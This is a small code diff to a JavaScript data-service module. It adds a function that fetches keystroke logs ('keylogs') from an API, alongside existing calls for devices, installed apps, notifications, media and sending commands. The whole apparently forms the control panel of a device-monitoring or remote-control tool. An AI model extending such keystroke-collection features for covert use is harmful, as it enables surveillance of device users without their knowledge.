@@ -48,6 +48,10 @@ const getNotifications = (token) => {
   return axios.get(`${API_URL}/users/me/notifications/`, getAuthHeaders(token));
 };
 
+const getKeylogs = (token) => {
+  return axios.get(`${API_URL}/users/me/keylogs/`, getAuthHeaders(token));
+};
+
 const getDevices = (token) => {
   return axios.get(`${API_URL}/devices/`, getAuthHeaders(token));
 };
@@ -69,9 +73,11 @@ const dataService = {
   getDevices,
   getInstalledApps,
   getNotifications,
+  getKeylogs,
   sendCommand,
   getDeviceMedia,
 };
 
 export default dataService;
+
 
